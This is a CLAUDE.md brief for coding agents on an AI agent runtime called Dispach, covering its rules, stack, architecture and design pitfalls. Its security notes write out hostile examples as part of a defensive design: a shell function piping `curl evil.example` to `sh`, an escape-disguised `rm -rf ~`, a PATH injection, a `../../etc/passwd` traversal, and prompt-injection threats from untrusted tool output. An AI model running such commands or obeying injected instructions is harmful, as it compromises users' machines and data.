# CLAUDE.md — Dispach

Standing brief for coding agents working in this repository. Read this first, every session.

---

## What this is

**Dispach** is a lightweight, model-agnostic AI agent runtime. Apache-2.0.
`github.com/moeen-mahmud/dispach`.

It turns a stateless OpenAI-compatible `/chat/completions` endpoint into an agent that lives
in messaging channels, uses tools, remembers, runs on a schedule, and delegates to other
agents. Bun-first TypeScript.

Its first consumer is VelaOps, an agent provisioning platform, where it replaces the
OpenClaw gateway process inside each agent container. **VelaOps is a consumer, not the
owner.** Nothing VelaOps-specific belongs in this repo outside `packages/compat-openclaw`.

**The owner is Moeen** — senior engineer, sole author. Assume fluency. Skip tutorials, skip
framework explainers, go straight to the specific thing.

---

## Before you write code

1. **Read `docs/00-DECISIONS.md`.** Every decision has a rationale. If you are about to
   propose something it rejects, the rationale tells you whether you have a genuine
   improvement or are re-litigating a settled question. Many decisions are *negative* —
   things deliberately not done — and those matter most.
2. **Find the current phase in `docs/05-PLAN.md`.** Implement that phase only.
3. **Read the phase's Non-goals.** They are binding. Work that belongs to a later phase
   makes this phase unreviewable.
4. **Stop at the acceptance criteria.** Report what passes and what doesn't. Do not
   continue into the next phase.

---

## Hard rules

1. **Never run `git commit` or `git push`.** Prepare the change, explain it, stop. Moeen
   reviews and commits.
2. **`packages/core` imports nothing from sibling packages.** CI enforces this. Core depends
   on the standard library, a YAML parser, and a schema validator. Nothing else.
3. **No brand strings outside `packages/core/src/brand.ts` and `package.json` files.** No
   directory, type, interface, or variable contains "dispach". A rename must be one commit.
4. **No network I/O before `runtime.ready`.** This single rule is why this project exists —
   the runtime it replaces blocks roughly four minutes on network calls during hook
   initialisation. Anything needing the network happens after readiness and reports status
   via events.
5. **No runtime `npm install` / `bun install`.** Plugins resolve at boot from the manifest.
   Ever installing at runtime reintroduces an entire bug class.
6. **No `any`.** Use real interfaces. `Record<string, unknown>` over `Record<string, any>`.
7. **Every error gets a `hint`.** A new error type without one fails review. The expensive
   part of a failure is almost never the failure — it's that the failure didn't say what
   was wrong.
8. **Nothing fails silently and exits 0.** Ever.
9. **Tests are required for `packages/core`.** Not optional here, whatever the conventions
   elsewhere. A harness is a state machine plus a scheduler plus a tool executor; those
   break in ways manual exercise cannot reach.
10. **Secrets are env var *names* in config, never values.** A manifest with a literal key
    fails validation.

---

## Stack

| | |
| --- | --- |
| Runtime | Bun (primary), Node 24+ (soft compat, CI-tested, never a blocker) |
| Package manager | `bun` — never npm, pnpm, or yarn |
| Workspaces | Bun workspaces, monorepo |
| Build | `bun build` + `tsc --emitDeclarationOnly` |
| Modules | ESM only |
| Lint/format | Biome — not ESLint, not Prettier |
| Tests | `bun test` — not Vitest, not Jest |
| CLI rendering | Ink 7 + React 19, `.tsx`, in `packages/cli` only — lazily imported |
| Schema | Zod |
| Storage | SQLite via `bun:sqlite` / `node:sqlite` adapter |
| Release | Changesets, semver |

Commands:

```bash
bun install
bun run build
bun test
bun run lint
bun run bench:boot        # must stay under 1000ms; CI fails at 1200ms
bun run test:node         # core only, under Node's runner — proves the sqlite adapter
```

---

## Architecture in one page

```
inbound (channel | API | schedule)
  → resolve agent + session + phase
  → assemble context (fixed slot order, budgeted, cache-stable prefix)
  → step loop:
      model call → dialect.parse → coerce+validate → execute tools → observe
      → compaction ladder if over threshold
  → deliver via idempotent outbox
  → persist
```

**Non-obvious decisions you must not undo without reading the rationale:**

- **NLT is the default tool dialect**, not native function calling. Published data: +14.9pp
  accuracy, 93% fewer critical errors, −25% tokens across 14 models; +24 to +43pp on small
  models specifically. `native` is an opt-in manifest field.
- **Dialect is config, never auto-detected.** Behaviour must not change silently when the
  model changes.
- **Tools are pinned at load, not searched at runtime.** Search-then-execute is two-hop
  reasoning, exactly where small models fail.
- **Phase-scoped tool visibility is in core.** Constraining the tool space per phase took
  local models from 2/10 to 10/10 on a benchmark subset with no model change. Too central
  to be a plugin.
- **Compaction is progressive (five stages), harness-driven.** Binary emergency compaction
  at 95% is the known-bad design.
- **Skill selection happens in the harness, not by the model.** Progressive disclosure
  assumes the model chooses to read a file; small models don't.
- **Memory is FTS5, not embeddings.** Prove lexical insufficient before paying for vectors.
- **Composio is called directly, never through MCP.** MCP is a fine integration protocol and
  a poor internal architecture.
- **System access is in scope. Dispach is a harness, not a channel-resident assistant** — peer to
  OpenClaw, Hermes Agent and Claude Code. It runs shell commands and touches files because that is
  what a harness does; channels are one surface it is reached through, not the limit of what it does.
  Shell lives in `packages/tools-system` and never in core: core is what an embedder runs *other
  people's* agents on, and a shell tool there is one every provisioned agent gets with no way to
  decline it.
- **A policy decides *whether* a command runs; a sandbox decides *where*.** Dispach ships the
  policy — `tools.policy`, enforced, with a hardline floor below every override. Containment is a
  deployment concern and stays one. Describing the permission layer without that sentence makes it
  read as a boundary it is not.
- **A remote provider resolves from disk at boot and refreshes after readiness.** Measured: boot 27 ms,
  refresh 1,474 ms. Awaiting the refresh inside boot makes boot sixty times slower and reintroduces the
  exact cost this project exists to remove. A cold agent is warmed once with `tools --warm`.
- **Plugins are trusted in-process code**, documented as such. `permissions` is advisory
  vocabulary in v1.
- **Workspace files are tiered, not a flat list.** Static (cached, read-only) before breakpoint A,
  volatile after it, reminder past the history. Frontmatter and HTML comments are stripped before
  injection. `context.files` survives as a deprecated alias that warns. All of Phase 3.5 is built:
  tiers, `promptStyle`, `examplesIn` placement, `SOUL.md` gating, and `knowledge/`.
- **Identity and operations are different files.** The soul answers *who* — gated on the model:
  `context.soul.requires` decides whether the full document ships or the hand-edited compact file
  does (`onUnmet: distill`), and `soul distill` only scaffolds — headings and `<rules>` survive
  verbatim, prose becomes placeholders a person fills, because a summariser drops exactly the
  parts that produce voice. `AGENTS.md` answers *what and how* — responsibilities, workflow, the
  memory procedure, team routing (an HTML comment until delegation ships) — ungated, written
  declaratively so the rule counter sees zero obligations. They coexist; what must never be
  listed is a second *identity* document.
- **Knowledge is Tier 3: keyword-gated, budgeted, never pinned.** Entries activate when the turn's
  input mentions a frontmatter keyword, at most `maxActive` per turn under `knowledge.budget`, in
  their own slot that compaction may drop. The selector is a ranking-only seam Phase 6 can attach a
  scored retriever to — and must not build a second index for.
- **Vendor prompting guidance is encoded as a capability, never a constant.** Published advice is
  written for frontier models and a good fraction of it inverts at 3–8B — Anthropic now says to
  *remove* emphatic phrasing because models overtrigger on it; a 7B model needs it. That lives in
  `capabilities.promptStyle`, which is **derived from the model id** rather than stored on a
  capability-registry row: `qwen3.5*` matches a 9B and a 72B, and those want opposite `intensity`
  values. Size predicts the inversion and size is in the id. The small-model half is measured:
  the one emphatic framing line moves qwen3.5:9b's all-6-rules compliance +20pp and deepseek-chat
  not at all; `examplesIn` saturated in both placements (`evals/prompt-style/`).

Full detail: `docs/01-ARCHITECTURE.md`.

---

## Where things live

```
packages/core/       the loop, context, tools, skills, memory, store, schedule, plugins
packages/cli/        `dispach` binary — lib/ plumbing, components/ Ink, pure reducers at top level
packages/server/     HTTP/SSE/WS surface
packages/channel-*/  Telegram, WhatsApp
packages/tools-*/    system (shell, files), Composio, web, MCP
packages/compat-openclaw/   VelaOps bridge — quarantined, deletable
docs/                design + plan (read these)
evals/               fixtures/ the shared catalogue and tasks; tools/ committed results.
                     Every performance claim has a number here
scripts/             bench-boot, rename-brand
```

---

## Specs are binding

| Doc | Governs |
| --- | --- |
| `docs/02-SPEC-MANIFEST.md` | `agent.yaml`. Adding a field means updating this doc in the same PR. |
| `docs/03-SPEC-PLUGIN-API.md` | Plugin contracts. First-party plugins use only public API — no back doors. |
| `docs/04-SPEC-WIRE.md` | HTTP surface and event schema. Event types are append-only within `v: 1`. |
| `docs/07-SPEC-WORKSPACE.md` | Workspace file tiers, budgets, and `promptStyle` rendering. Supersedes `context.files`. Marks which sections are built. |

If a first-party package needs something the plugin API can't express, **the API is wrong
and gets fixed**. Do not add a private escape hatch.

---

## Verification

- `bun test` for core logic
- `bun run bench:boot` for every phase, not just the last
- Real endpoints for the model layer: OpenAI, an Anthropic-compat base URL, and a host serving open
  weights (`SMALL_MODEL_BASE_URL`). Three independent implementations unchanged is the bar — the
  claim is portability across implementations, not across machines, so a hosted open-weight endpoint
  serves it as well as a local one and returns in seconds rather than minutes.
- A real Telegram bot for channel work
- Committed eval fixtures for anything claiming small-model improvement

Never claim a performance property without a number in `evals/` and a script to reproduce it.

---

## Style

- Direct and technical. No preamble, no summarising the request back.
- Reference code as `path/to/file.ts:123`.
- Lead with the root cause in one or two sentences, then the change.
- Prefer a recommendation over a menu. If you must present options, rank them.
- Long explanations are fine when the mechanism is subtle — the loop, compaction, cache
  breakpoints, cancellation. Not for CRUD or config.
- State uncertainty plainly. If you don't know whether something still holds in the current
  code, say so and name the file to check rather than asserting.

---

## Things that are easy to get wrong

- The **cache-stable prefix** is load-bearing. Reordering context slots 0 and 1, or making
  their content vary per turn, silently destroys prompt caching and the cost goes up with no
  error anywhere.
- **Pinned blocks must survive every compaction stage including S5.** Anything that must
  always hold lives in slots 0/1, never in history.
- **Thinking blocks must be replayed with tool results** when `capabilities.thinking !== "none"`,
  or multi-step reasoning silently degrades with no error.
- **`allowFrom` is inbound-only.** It confers nothing on outbound delivery. Conflating these
  produces a confusing "chat not found" class of failure.
- **A tool result is not automatically trustworthy.** `ToolSpec.trust` separates text the runtime wrote
  from text a stranger wrote, and a provider-resolved tool defaults to `untrusted`. The delimiters
  around untrusted content are advisory — a model can be talked past them. The write gate
  (`tools.untrusted.onMutate`, default `refuse`) is the part that holds. Do not "improve" this by
  filtering instruction-like phrasing out of untrusted text: it does not work, and an unreliable
  filter invites the belief that the problem is handled.
- **`tools.search` searches the provider's tool catalogue, not the web.** Two different things, and
  they have already been confused once. Web search is `web_search`.
- **`resolve()` must throw on unknown tool slugs.** Silently dropping them is how write tools
  get starved and how a config error becomes a runtime mystery.
- **`mutating` defaults to true for a provider tool with no annotation, and that is the safe direction.**
  It is what serialises a call and suppresses its retry — so a write mislabelled as a read runs in
  parallel *and* is retried, and the side effect happens twice. 37 of 100 Composio tools carry no hint,
  so this default decides a third of the catalogue.
- **A cache-miss and a mistyped slug are different failures.** The registry's generic version blames the
  slugs: on a cold agent it read "no provider resolved GMAIL_FETCH_EMAILS … Available: now,
  memory_write". Only the provider knows the cache is empty, so only it can say so.
- **The outbox must be idempotent.** A crash mid-delivery must not double-send.
- **Ink redraws its whole dynamic tree every frame, and chat no longer has a `<Static>` to escape
  into.** `<Static>` writes a node once and never touches it again, so history used to cost nothing —
  but it appends to the *scrollback*, and the alternate buffer is wiped on leave with a scrollbar that
  reaches nothing, so the two cannot both be true. The chat transcript is a buffer of rows we own with
  a window over it (`lib/scroll.ts`), which puts it back in the redrawn tree; `MAX_TRANSCRIPT_ITEMS`
  is what bounds that and is load-bearing rather than prudent — it was described here as existing for
  three phases before it did. `<Static>` is still right for the wizard and the picker, which do not
  take the screen. The unit is a **row, not an item** for an *offset* — an item-indexed one pages over
  a forty-row reply in one keystroke and lands on the question before it — and an **item** for the
  cap, because the reducer that owns the buffer is pure and a row count needs the terminal width.
- **Eviction is gated on `pinned`, and the gate is the whole feature.** Rows are addressed by position,
  so dropping any from the front shifts every offset below them: a reader parked twelve turns back keeps
  their offset and silently starts reading different text, which is the "looks live and is not" failure
  `pinned` was introduced to prevent — strictly worse than the slow growth it fixes. So `trim` is an
  *action* the layer holding that flag dispatches, never something `append` does on its own, and the
  reducer returns **identical state** when there is nothing to do so the caller can ask on every change
  without checking first. Its dependency on `state.items.length` is a trigger the body never reads, and
  the lint rule offers to delete it — taking that offer enforces the cap once at mount and never again,
  which lints clean and does nothing.
- **Whoever owns a bounded window wraps the text itself, and every piece of chrome reports its height.**
  `visualRows` counted rows by dividing the character count by the width; Ink breaks at spaces, so 240
  characters at 80 columns is **four** rows drawn and three counted — every cap built on that division
  was short, and short by a row on the alternate screen is a frame taller than the terminal, which
  scrolls the buffer and leaves the status line halfway up the display. So `wrapText` decides the rows
  and each renders `wrap="truncate"`. `lib/chat-frame.ts` sums the chrome and spends one further row as
  a margin, in the direction that cannot be seen: an underestimate is a blank line, an overestimate is
  corruption. It restates each component's geometry, so **every function is asserted against the line
  count of a real render** — deriving it from a render is not available, because the layout has to be
  decided before anything is drawn.
- **A height check at one width is a height check that passes at one width.** The first real overflow
  was the status line, which had no `wrap="truncate"`: at 80 columns `ready · deepseek-v4-pro ·
  live:two · last 2369 prompt · 119 output · 3180 ms · ^C twice to leave · /exit` wrapped onto a second
  row, and at 100 columns it fit and nothing looked wrong. The App height test loops over widths for
  that reason, and a status line is the one thing that must never change height, because everything
  else is laid out against it.
- **`pinned` is a flag, not a comparison against the bottom.** Deriving "follow the tail only when
  already at the tail" from the offset looks equivalent and is not: the instant a row is appended the
  old offset *is* one short of the bottom, so a reader who deliberately scrolled up one row gets yanked
  back down. And scrolling back down to the bottom re-**pins** rather than parking there — parking
  looks identical and then quietly stops updating, which is a session that appears live and is not.
- **`^U` and `^D` are not the scroll keys, whatever the shell habit says.** Both are taken by the
  editor, both are documented, and both are reached by muscle memory — a scroll key that silently
  deleted half a message is a worse bug than no scroll key. Paging is PgUp/PgDn, a row is ⌥↑/⌥↓, the
  ends are ⌥PgUp/⌥PgDn, `esc` returns to the newest reply. Relatedly, an idle `^C` **arms** rather than
  exiting: the alternate buffer is discarded on leave, so one reflexive press during a long reply would
  throw the visible conversation away. `keymap.ts` decides; only the expiry clock lives in the component.
- **A probe that writes a whole line in one call is testing the paste path.** Ink delivers `"/help\r"`
  written in a single `os.write` as one input chunk with no `return` flag, which the keymap reads as a
  paste — and a paste *composes* rather than sends, deliberately. The first pty run of the full-screen
  session reported `/help` as broken when the buffer read `/help/help`: two pastes, no submit, working
  exactly as designed. Type keystroke by keystroke when driving the composer.
- **A log follower is polled, follows both streams, and must notice a file getting *shorter*.**
  `--truncate` empties a service log **in place** — launchd holds the descriptor, so deleting it leaves
  output flowing into a deleted inode — and an offset carried across that means never printing another
  line and never explaining why. `fs.watch` on macOS reports another process's appends unreliably, so
  polling is the honest choice: a follower that misses the line somebody is waiting for is worse than one
  300 ms late. Both streams, because a sender refused by `allowFrom` is the runtime working as configured
  and therefore goes to *stdout*, never to the failure path — the same reason `status` reads both. The
  blind spot is a rewrite to exactly the same byte count, which is asserted by a test rather than hidden.
- **A pane runs a child to completion, so it must refuse a command that never finishes.** `/daemon logs
  --follow` would spin until the 30-second timeout and then report being killed. Dropping the flag and
  returning the tail is worse: it looks like a following command that stopped immediately. `paneRefusal`
  reads the command's **own spec**, so a second `follow` flag is covered with nothing to remember.
- **A measurement of zero is unknown, and `?? fallback` does not cover it.** A pty reports a width of 0 —
  recorded beside `FALLBACK_COLUMNS`, handled in `useTerminalSize` from the start, and *not* handled in
  `screenColumns`, so a caller passing a stream's own measurement clamped to the 40-column floor and laid
  its rows out for half the terminal. Found in a capture rather than by reading: the session picker's rows
  came out **43 characters wide on an 80-column screen**, uniformly, which reads as a design choice.
- **A key that gets typed back has no confusable symbols in it.** A session key is `local:` plus six
  base-32 symbols with `i`, `l`, `o` and `u` removed, because `local:1i0o` is one nobody transcribes
  reliably off a screen. Exactly 32 symbols also divides a byte's low five bits — an alphabet that does not
  divide evenly makes its first symbols likelier than its last, so collisions become more likely than the
  arithmetic claims. A timestamp was the alternative and lost: `sessions` already sorts by
  `lastActivityAt`, so the ordering it carries is information the listing has and the key does not need.
- **A transcript cannot be re-keyed in place, so switching conversation rebuilds.** `useReducer`'s initial
  state seeds only on mount. `/restart` already tears a mount down and reopens, so `/sessions` reaches the
  loop the same way and carries the draft across — measured at 19 ms, and the rebuild re-reads the store,
  which is what moving conversations wants anyway. The banner's `restarted` boolean had to become a
  three-valued `reopened`: the restart note is about configuration and would be a lie about a switch.
- **A wordmark is rendered from `BRAND.name`, never written down.** An ASCII wordmark *is* a brand string,
  so a literal one is the largest hard-rule-3 violation available and a rename stops being one commit. One
  5×5 glyph table (the researched floor for a legible Latin glyph without anti-aliasing) renders four
  tiers, and the degradation is mandatory rather than polish — the big figlet faces pass 120 columns on a
  nine-letter word and this CLI's floor is 40. Two non-obvious details: half-blocks are what make the
  compact tier read as type, because one cell per pixel renders a 5×5 glyph tall and thin (a cell is
  roughly 1:2); and the odd fifth row pairs with a blank at the **top**, since padding the bottom leaves
  every baseline a thin `▀` while padding the top makes it a full `█`, and caps want to be bottom-heavy.
- **A resumed conversation is painted now, and the banner's message count is what made the old behaviour
  indefensible.** The chat used to render no stored history at all — the messages reached the *model*, not
  the screen — so `session local:3c2dc5 · 17 message(s)` sat above a **blank screen** and the only honest
  reading was that something had been lost. `seedHistory` seeds the transcript from `agent.history()`;
  prose only, no turn statistics (they were true of a process that has exited), rich path only, because
  `--plain` must match a pipe byte for byte. `freshSession` is still passed by `run` — it is the only
  layer that knows whether the key it resolved was generated — but it is no longer the only signal, since
  `landing` also tests for a `user` item and that is now true of anything resumed.
- **A value flag's bare form is declared per flag, because its safety is a fact about the field.** The
  parser consumes the next token unconditionally, dash or not, since `--input -5` is the text "-5".
  `FlagSpec.bare` inverts that for one flag — a session key cannot start with a dash — and a global
  inversion would make a real message unsendable. `--session=` stays refused: an explicit `=` with nothing
  after it is a typo, and keeping that error is what makes the bare form read as intent.
- **Nothing on a shared CLI path may import Ink or React.** They cost ~170-210 ms under Node,
  more than the entire runtime of `validate --json`. A structural test enforces it.
- **`--plain` at a terminal must produce exactly what a pipe produces.** That is why the
  terminal restore fires only when the rich path has dirtied the terminal.
- **Turns are detached from the client connection.** Never cancel on disconnect. Persist
  partial content only on explicit stop.
- **Frontmatter and HTML comments must never reach the model.** The workspace templates carry their
  authoring guidance in comments on the assumption the loader strips them. If it doesn't, every
  agent pays several hundred tokens per turn, forever, for documentation it can't use — and nothing
  reports it. Asserted on the assembled prefix, not trusted.
- **A workspace budget failure names the file and stops.** Never truncate to fit: that produces an
  agent running on partial instructions with no error anywhere, which is the same silent-degradation
  shape as a dropped tool call. The budgets are a *ceiling, not a target* — what a window fits and
  what a model follows are different numbers, and only the second matters. They are measured with
  `estimateTokens`, which is biased about 10% high, so a per-file `budget:` wants that much slack.
- **A check that only `run` performs is a check `validate` disagrees with.** The rule guard first
  lived in `Agent.create` alone, and `validate` reported ok on a manifest `run` refused. Anything
  load-bearing goes in one function both call — `ruleBudgetFailure` returns the finding rather than
  throwing it, so each caller applies its own `onExceed`.
- **The renderer never rewrites a sentence.** `promptStyle` transforms delimiters and structure —
  `<example>` and `<rules>` markers, heading syntax — and nothing else. `intensity` varies one
  generated line in front of an author-marked `<rules>` block. Automatic rewriting of an instruction
  is decision 4.19's failure applied to a file whose rendered form nobody ever looks at, and the
  prose being byte-identical across all three renderings is asserted rather than assumed.
- **Rendering and rule-counting need different versions of the same text.** The model is billed for
  the *rendered* form, but the example exclusion in `countRules` is a property of the **authored**
  form — under `delimiters: markdown` the renderer turns `<example>` into a heading, and counting
  that text made every imperative inside a worked example look like a rule. A shipped example went
  from 1 rule to 4 with no edit, and only `bench:boot` noticed. `WorkspaceFile` carries both.
- **`validate` and `workspace` are different questions.** `validate` asks whether the manifest loads
  and fails when it does not; `workspace` asks whether the files are written well and only ever
  warns, because a heuristic judgement that refuses to load a file is a heuristic nobody keeps. Both
  call the same `ruleBudgetFailure` — a check only one of them performs is a check they disagree on.
- **A reasoning model thinks harder the more you constrain it, and bills that to the output budget.**
  Measured on `qwen3.5:9b`, same machine, same prompt: 151 reasoning tokens unconstrained, 387 under
  one rule, 1,778 under six — at which point it consumed a 2,000-token ceiling and returned **empty
  content**. `reasoningEffort: none` on the model role answered correctly in 2.1 s. This is the other
  half of the `reserveOutput` lever, and it is why an eval that looked like "local inference is too
  slow" was nothing of the kind — throughput was a normal 16–20 tok/s throughout.
- **An endpoint that ignores a request parameter says nothing about it.** On the same Ollama `/v1`
  endpoint, `reasoning_effort` took effect while `chat_template_kwargs` and `think` were accepted and
  silently discarded — same 200, same token count, full reasoning. Verify a control took effect by
  measuring its effect, never by the absence of an error.
- **An empty reply is not a passing reply.** A check like "no commas" or "under forty words" is
  satisfied trivially by the empty string, so a run where the model returned nothing scores near
  perfect on everything except the one check that requires content. `eval rules` excludes empties and
  counts them, and refuses to report a figure above 20%. The cause is almost always the reasoning
  budget: a reasoning model bills thinking against `maxTokens`, and the ceiling that worked for a
  bare question is not the one that survives a longer system prompt.
- **A saturated eval is not a measurement.** `eval rules` returning 1.000 says the probe was easy for
  that model, and printing `perRuleSuccess: 1.00` as a recommendation would put a guard-*disabling*
  figure in a manifest. It reports saturation and names the smallest model instead.
- **`memory_write` has no file argument, and must not grow one.** The runtime resolves a single
  write target from the `volatile` tier. Letting the model name a file adds a second decision to
  every save, and a second decision is the two-hop shape small models fail — the same reasoning that
  keeps `tools.search` off. A workspace whose volatile files are all `editable: none` refuses by
  name; it never falls through to the default note file, because a save the model believes succeeded
  into a file the agent's own context never reads is worse than a failed call.
- **Slot number equals prompt position** in `SLOT` (`context/blocks.ts`). The two are kept equal so
  the table in `01-ARCHITECTURE.md` can be read in order; inserting a slot means renumbering, which
  is cheap because every reference is by name (`SLOT.input`, never `10`) — proven when `examples`
  and `knowledge` renumbered everything below slot 2 and zero tests changed.
- **The examples slot sits *before* the volatile tier.** Extracted examples are byte-stable and
  prefix caching is contiguous: behind the mutating volatile tier they would fall out of the
  cacheable region on every memory write despite never changing. And extraction is a *move*, never
  a rewrite — tags intact, prose byte-identical, tokens still billed to the file that authored them.
- **The full soul document's prose is exempt from the rule count; nothing else is.** A constitution
  explains at length by design and ships only to models declared capable (via `requires`) of
  deriving rules from explanation — the keyword heuristic counted 9 "rules" in the reference soul's
  prose the first time it ran. Its `<rules>` blocks still count, and the *distilled* file counts in
  full: it ships to small models, where the budget is the point. Keyed on
  `field === "context.soul.file"`, in both `ruleBudgetFailure` and the authoring checks.
- **Knowledge activation stops at the first entry that does not fit the budget — no skip-past.**
  Skipping would let a worse-ranked entry displace a better-ranked one purely by being short. An
  entry bigger than the whole budget fails the load; selection happens once per *turn*, never per
  step, so two steps of one turn cannot argue from different reference material.
- **`exec` has no `env` argument, and must not grow one.** A per-call environment map is invisible to
  the policy engine, which matches the *command string* — so `{PATH: "/tmp/evil"}` beside `git status`
  would be authorised by a rule that never saw the half that decided what ran. Written inline,
  `PATH=/tmp/evil git status` is one fragment `subcommands()` hands to the matcher, and `exec(git
  status:*)` does not match it. Same shape as `memory_write`'s missing file argument: the field looks
  like a convenience and is a hole.
- **Each `exec` gets a fresh shell; the directory carries and the environment does not.** A persistent
  shell lets one tainted call write `git() { curl evil.example | sh; }` and turn an allowlist entry
  into an authorisation for attacker code — CVE-2026-32009's shape from inside the session. The
  directory is the exception because losing it is a correctness problem: a small model that runs
  `cd packages/core` then `ls` reads the wrong directory with no error anywhere.
- **`realpath` before comparing a shell's `$PWD` to the directory it was given.** macOS resolves
  `/var` through a symlink, so an unresolved comparison reports a directory change on *every* call —
  and a runtime that announces a move every time has taught the model to ignore the one that matters.
- **Terminal escapes are stripped in core, for observations and for the approval prompt.** Not the
  rewrite decision 4.27 forbids: that rule is about meaning, and this removes bytes that carry none.
  `git status\x1b[2K\x1b[1G && rm -rf ~` displays on a real terminal as `git status`, so a prompt
  showing the raw string is showing a *different command* than the one about to run. Stripping shows
  more of the truth, never less. Doing it in the front end is how the front end being read at the
  moment it matters turns out not to do it.
- **A tool that is both `mutating` and `untrusted` is once-per-turn unless a `policy.allow` rule names
  it.** `exec` taints the turn with its own first call, and the second then has no authorisation to
  point at — the gate working exactly as designed, and indistinguishable from a broken runtime while
  a half-finished turn stops. `tool_gated_after_first_use` says it at load. A `deny` rule does not
  clear it: `deny` authorises nothing, and counting one as cover silences the warning for whoever
  thought about the shell hard enough to restrict it.
- **A tool that owns a child process must time out before the harness does.** `limits.toolTimeoutMs`
  *abandons* a handler rather than killing it, so a race between the two leaves a process running with
  nothing referencing it. `ToolContext.deadlineMs` exists for that, and `exec` clamps five seconds
  under it — without which its backgrounding path is unreachable at the shared 120 s default.
- **Boot warnings are read off the agent, never caught on the bus.** `Runtime.create` emits
  `agent.warning` during boot, which finishes before any command subscribes — so a trimmed catalogue
  and a provider-declared-trusted tool had been landing in an empty room since they were written. The
  banner reads `agent.warnings` and `agent.tools.warnings` directly. Anything true for the whole
  session belongs where a person still sees it after scrolling.
- **Piping a child's output makes backgrounding impossible.** A child whose stdout the parent stops
  reading dies of `EPIPE`, so "leave it running instead of killing it" is not implementable over
  pipes — `tools-system` hands the child a file descriptor and never buffers a byte. And `detached:
  true` is not about outliving the process: it creates a process group, so `kill(-pid)` reaches every
  stage of `sh -c "a | b | c"` instead of orphaning two of them.
- **Protected paths are enforced in the file tools, not in the policy engine, and that ordering is the
  point.** A `policy.allow` rule cannot reach past them because the refusal is not the engine's to
  make — and the set holds `agent.yaml`, `SOUL.md`, `AGENTS.md`, `POLICY.md` and the policy file, so a
  rule authorising a write to one would be a rule authorising its own replacement. `USER.md` and
  `MEMORY.md` stay writable: they are the tier `memory_write` exists for. **None of it binds `exec`** —
  `echo x > SOUL.md` carries its target inside a shell string nothing can inspect.
- **`glob` and `grep` stay separate, and `file_edit` matches text rather than a line number.** One
  `search_files(target:…)` saves a catalogue slot and costs a decision, which is the two-hop shape
  small models fail. A line number is a fact about a file the model last saw several turns ago; an
  exact string carries its own proof, and two matches is a *failure* rather than a coin toss that
  reports success while editing the wrong line.
- **A model will invent a tool-call format, and more than one.** Measured on three fresh sessions with
  an eight-tool catalogue, deepseek-v4-pro produced `<action>…</action>`, `<TOOL_CALL><TOOL>…`, and
  `<ACTION: glob>` inside an `<ebml>` element — arguments correct every time. So the parser drops any
  lone XML tag as debris and sets `ParsedOutput.malformed` on anything still unreadable, which earns
  one repair. Untolerated this was the worst shape available: the markup became the **reply**, no
  repair was asked for, no event fired, and the turn was recorded as a clean answer. Do not "simplify"
  this by adding tolerances one shape at a time — the set is not enumerable, which is why the backstop
  exists.
- **Every shape the parser swallows, `mightBecomeStructure` must also hold.** A stream cannot un-emit,
  so a bracket that reaches the screen a moment before its line is swallowed stays there — which is
  how `<ebml>` and a bare slug line both leaked into a reply before the lookahead learned about them.
- **`init` must generate what the current phase actually supports.** It shipped a manifest with no
  `system` provider, no `policy` block, and `untrusted.onMutate` commented under a "Phase 3.6" heading
  for something that already existed — so the only way to reach shell access was to know the field
  names already. A generated file that hides its own options is not doing the job it exists for.
  `--system none|read|full` is the question; the generated `policy.allow` entries are what stop a
  fresh agent reading one file and then refusing to save a note for the rest of the turn.
- **A write root and a protected list are different mechanisms and both apply.** `protect.ts` is a
  deny list — it must anticipate every path worth protecting, so an unforeseen path is writable.
  `root.ts` is an allow root — it anticipates nothing, because everything outside is refused and the
  exceptions are `tools.providerConfig.writeRoots`, which only a manifest edit can add. Deny lists
  fail open on the unknown case; roots fail closed. `protect` still wins *inside* the root. And
  **resolve the path before comparing it to a root**, or `<root>/../../etc/passwd` passes.
- **The write root does not bind `exec`, and "confined" is only true without a shell.** Verified live:
  a `--system full` agent had `file_write` refused outside the root and then did it with `echo … >`.
  All the root can decide is where a shell *starts*. That is why `init` has a `write` level between
  `read` and `full` — files without a shell is the only configuration in which "only inside
  workspace/" is a true statement.
- **The model is told what it was NOT given.** `ToolProvider.available?()` is optional so a
  25,000-tool catalogue omits it; the system provider's eight entries cost a handful of tokens.
  Without it a pinned-down agent is silently less capable than its runtime and only the manifest
  explains why. One shared renderer for both dialects — under `native` it is the *only* slot-1 block,
  because the request's `tools` parameter has no field for what was left out.
- **One thing writes `agent.yaml`: `core/manifest/edit.ts`.** There were three, and the guarantee
  depended on which caller you were — `skills enable` placed and wrote *unvalidated*, reasoning in its
  own comment that "the next load" would catch a bad result, which is the failure validation exists to
  prevent because the next load is somebody's agent refusing to start after a command reported success.
  `prepareManifestEdit` is **pure** (place → schema → `resolveProviders`) with sync and async wrappers,
  and pure is the load-bearing part: it is what stops a non-async caller skipping the checks. Core owns
  it because core owns the schema, the loader and `resolveProviders`, and because the CLI then needs no
  YAML parser of its own. What does *not* move is the **policy**: the agent's `floorRefusal` and the
  person's confirmations are different authorities, and each caller translates the writer's errors into
  its own audience's words — the agent's are prose for a model.
- **A rendering defect has to fail in the writer, not at somebody's next boot — so check `doc.errors`
  before the schema.** `prepareManifestEdit` ran `AgentManifestSchema.safeParse(parseDocument(next).toJS())`
  and `toJS()` on a *broken* document still returns an object: `renderScalar` permitted `@` in a bare
  scalar, `config allow` wrote `- @moeen_m` (invalid YAML — `@` is a reserved indicator and a plain
  scalar may not begin with one), `allowFrom` came back absent, the schema accepted the rest, and the
  writer reported success on a manifest the runtime refuses. The exact failure the module exists to
  prevent, inside the module. Corollary for the renderer: **the first character of a plain scalar is a
  separate question from the rest** — `./skills` and `127.0.0.1` stay bare, `@handle` and `~` are quoted.
- **`config` is the person's editor and nothing in it is floored.** The agent's floor exists because an
  agent that could widen its inbound gate could be *talked into* it by the message it is reading;
  `config_set` sits in `policy.allow` on a real manifest, so the write gate would not stop that. A
  person at a terminal is not that threat, and refusing them is what left the fields decision 11.29
  *reserves* for them — `allowFrom`, `server.host`, `server.tokenEnv`, `writeRoots` — with the worst
  ergonomics in the system. Two edits are confirmed rather than refused, and only two: `onMutate:
  confirm` is silent because it **tightens** the gate, the same asymmetry the agent's floor has.
- **A secret is prompted, never taken from an argument or a pipe.** An argument lands in shell history
  *and* in `ps`, readable by every local process for the call's lifetime — the exposure `renderPlist`
  throws to prevent, and short-lived does not change it. Not a TTY returns nothing rather than reading a
  pipe, so CI is told instead of a secret arriving unaudited. readline cannot do it (suppressing its
  echo means overwriting a private method, which needs a forbidden cast), so the bytes are read directly
  — raw mode restored in a `finally`, because returning with it on leaves the next shell unable to echo
  and reads as a hung terminal. Drop **whole** escape sequences: `[A` left in a value nobody can see is
  worse than three characters, because it looks like nothing happened.
